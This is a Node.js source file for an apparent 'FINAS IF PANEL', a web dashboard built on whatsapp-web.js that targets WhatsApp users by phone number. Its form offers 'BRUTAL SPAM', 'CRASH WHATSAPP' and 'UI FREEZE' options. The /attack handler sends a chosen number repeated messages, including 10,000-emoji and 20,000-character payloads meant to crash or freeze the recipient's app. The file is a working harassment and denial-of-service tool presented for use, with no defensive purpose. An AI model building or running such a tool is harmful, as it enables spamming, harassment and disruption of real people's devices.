const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
const port = process.env.PORT || 3000;

// MESIN UTAMA FINAS IF
const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: { 
        headless: true, 
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--no-zygote', '--single-process', '--disable-gpu'] 
    }
});

client.on('qr', (qr) => {
    console.log('SCAN QR DI LOGS RAILWAY:');
    qrcode.generate(qr, {small: true});
});

client.on('ready', () => {
    console.log('✅ FINAS IF PANEL ONLINE!');
});

// TAMPILAN DASHBOARD LUXURY NEON
app.get('/', (req, res) => {
    res.send(`
        <html>
        <head>
            <title>FINAS IF PANEL</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { 
                    background: #050505; 
                    color: #fff; 
                    font-family: 'Orbitron', sans-serif; 
                    text-align: center; 
                    padding: 20px;
                    background-image: radial-gradient(circle, #1a1a2e 0%, #050505 100%);
                }
                .card { 
                    border: 2px solid #bc13fe; 
                    background: rgba(10, 10, 10, 0.9); 
                    padding: 25px; 
                    border-radius: 20px; 
                    box-shadow: 0 0 20px #bc13fe, inset 0 0 10px #bc13fe; 
                    max-width: 420px; 
                    margin: auto; 
                }
                
                /* FOTO PANEL FINAS */
                .banner { 
                    width: 100%; 
                    border-radius: 15px; 
                    border: 1px solid #bc13fe;
                    margin-bottom: 15px;
                    box-shadow: 0 0 15px rgba(188, 19, 254, 0.5);
                }
                
                h1 { 
                    color: #fff; 
                    text-shadow: 0 0 10px #bc13fe, 0 0 20px #bc13fe; 
                    font-size: 24px;
                    margin: 10px 0;
                }
                
                input, select, button { 
                    width: 100%; 
                    padding: 14px; 
                    margin: 10px 0; 
                    border-radius: 12px; 
                    border: 1px solid #bc13fe; 
                    background: #000; 
                    color: #fff; 
                    font-size: 16px; 
                    outline: none;
                }
                
                button { 
                    background: linear-gradient(45deg, #bc13fe, #5a189a); 
                    font-weight: bold; 
                    cursor: pointer; 
                    border: none;
                    text-transform: uppercase;
                    transition: 0.3s;
                }
                
                button:hover { 
                    box-shadow: 0 0 20px #bc13fe; 
                    transform: translateY(-2px);
                }

                .status { font-size: 12px; color: #00ff00; text-shadow: 0 0 5px #00ff00; }
            </style>
        </head>
        <body>
            <div class="card">
                <img src="https://raw.githubusercontent.com/Finas-IF/assets/main/finas-neon.png" onerror="this.src='https://i.ibb.co/LhY0mC4/finas-generated.png'" class="banner">
                
                <h1>FINAS IF PANEL</h1>
                <p class="status">● SYSTEM ACTIVE</p>
                
                <form action="/attack" method="POST">
                    <input type="text" name="number" placeholder="628xxxxxxxxxx" required>
                    <select name="type">
                        <option value="spam">💥 BRUTAL SPAM</option>
                        <option value="crash">💀 CRASH WHATSAPP</option>
                        <option value="freeze">☣️ UI FREEZE</option>
                    </select>
                    <input type="number" name="count" placeholder="Amount" value="10" required>
                    <button type="submit">EXECUTE ATTACK</button>
                </form>
                <p style="font-size: 10px; color: #444; margin-top: 15px;">OWNER BY FINAS IF © 2026</p>
            </div>
        </body>
        </html>
    `);
});

app.post('/attack', async (req, res) => {
    const { number, type, count } = req.body;
    const chatId = number + "@c.us";
    let text = "🔥 ATTACKED BY FINAS IF 🔥"; 

    if (type === "crash") text = "🔥".repeat(5000) + "BUG-FINAS-IF" + "☠️".repeat(5000);
    if (type === "freeze") text = "░".repeat(20000);

    for (let i = 0; i < count; i++) {
        try {
            await client.sendMessage(chatId, text);
            await new Promise(r => setTimeout(r, 800)); // Delay dikit biar stabil
        } catch (e) { console.log(e); }
    }
    res.send('<body style="background:#000;color:#bc13fe;text-align:center;padding-top:50px;font-family:sans-serif;"><h1>SUCCESS!</h1><p>Attack Sent Successfully</p><a href="/" style="color:white;text-decoration:none;border:1px solid #bc13fe;padding:10px 20px;border-radius:10px;">BACK TO HOME</a></body>');
});

app.listen(port, '0.0.0.0', () => {
    console.log('Server running on port: ' + port);
});

client.initialize();
